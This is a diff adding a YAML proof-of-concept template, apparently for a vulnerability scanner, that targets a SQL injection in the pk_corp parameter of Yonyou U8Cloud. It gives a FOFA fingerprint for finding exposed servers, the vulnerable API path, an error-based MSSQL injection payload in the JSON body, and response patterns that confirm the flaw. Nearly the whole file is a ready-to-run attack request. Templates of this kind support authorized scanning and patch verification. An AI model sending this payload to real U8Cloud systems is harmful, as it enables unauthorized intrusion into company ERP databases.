@@ -1,0 +1,22 @@
+id: poc-yaml-yongyou-u8-cloud-pk-corp-sqli
+info:
+  name: 用友U8Cloud pk_corp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8cloud
+  fofa: app="用友-U8-Cloud"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /u8cloud/openapi/so.saleorder.briefing?appcode=huo&isEncrypt=N
+  headers:
+    Content-Type: application/json
+  data: '{"pk_corp":"'' AND 9173 IN (SELECT (sys.fn_varbintohexstr(hashbytes(''MD5'',''{{.t1}}''))))
+    AND ''rhYc''=''rhYc","cuserid":"","date_begin":"","date_end":"",}'
+  expression: "status_code == 200 && \ncontains(body,\"0x\" + t2) &&\ncontains(body,\"\
+    U8C返回信息\") &&\nmatches(body,\"转换成数据类型(.*?)时失败\") &&\nmatches(body,\"在将(.*?)值\"\
+    )\n"
+transport: http
